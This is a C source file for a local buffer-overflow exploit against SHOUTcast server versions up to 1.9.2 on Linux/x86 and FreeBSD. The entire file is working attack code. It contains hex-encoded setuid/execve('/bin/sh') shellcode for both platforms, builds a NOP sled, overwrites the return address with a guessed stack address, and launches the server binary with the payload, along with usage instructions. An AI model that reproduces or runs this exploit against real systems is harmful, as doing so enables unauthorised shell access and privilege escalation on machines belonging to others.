/*
 *  Pretty lame universal SHOUTcast <=1.9.2 local exploit
 *    for Linux/x86 and FreeBSD
 *
 *  Tested on 1.8.2, 1.8.9, 1.9.2.
 *
 * -d4rkgr3y // m00.void.ru
*/

#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>

long get_esp(){
	__asm__ ("movl %esp,%eax");
}

static char lnxshellcode[]=
	"\x31\xc0\x31\xdb\xb0\x17\xcd\x80"
	"\xb0\x2e\xcd\x80\xeb\x15\x5b\x31"
	"\xc0\x88\x43\x07\x89\x5b\x08\x89"
	"\x43\x0c\x8d\x4b\x08\x31\xd2\xb0"
	"\x0b\xcd\x80\xe8\xe6\xff\xff\xff"
	"/bin/sh";

static char bsdshellcode[]=
"\xeb\x16\x5e\x31\xc0\x8d\x0e\x89"
"\x4e\x08\x89\x46\x0c\x8d\x4e\x08"
"\x50\x51\x56\x50\xb0\x3b\xcd\x80"
"\xe8\xe5\xff\xff\xff/bin/sh";

#define NOP     0x90

int main(int argc, char **argv)
{
	int offset=1220;
	char buffer[1500];
	long retaddr;
	char shellcode[100];
	int i;
	printf("[~] SHOUTcast 1.x.x local exploit by m00 Security\n\n");

	if(argv[1]) {
		if(atoi(argv[1])==1)
			for(i=0;i<strlen(lnxshellcode);i++) shellcode[i]=lnxshellcode[i];
		else if(atoi(argv[1])==2)
			for(i=0;i<strlen(bsdshellcode);i++) shellcode[i]=bsdshellcode[i];
		else usage(argv[0]);
	} else usage(argv[0]);
	if(argv[2]) offset = atoi(argv[2]);

	retaddr=get_esp()+offset;

	printf("[~] Offset: 0x%x\n[~] ESP: 0x%x\n[~] Retaddr: 0x%x\n\n",offset,get_esp(),retaddr);
	for (i=0;i<1003-strlen(shellcode);i++) {
		buffer[i] = NOP;
	}
	for (i=0;i<strlen(shellcode);i++) {
		buffer[1003-strlen(shellcode)+i] = shellcode[i];
	}

	for (i=0;i<400;i+=4) {
		*(long *)&buffer[i+1003] = retaddr;
	}

	execl("./sc_serv","b0f",buffer,NULL);
}

int usage(char *prog) {
	printf("[~] Usage: %s <target> [offset]\n[~] Targets:\n\t1 - Linux\n\t2 - FreeBSD\n\n",prog);
	exit(0);
}
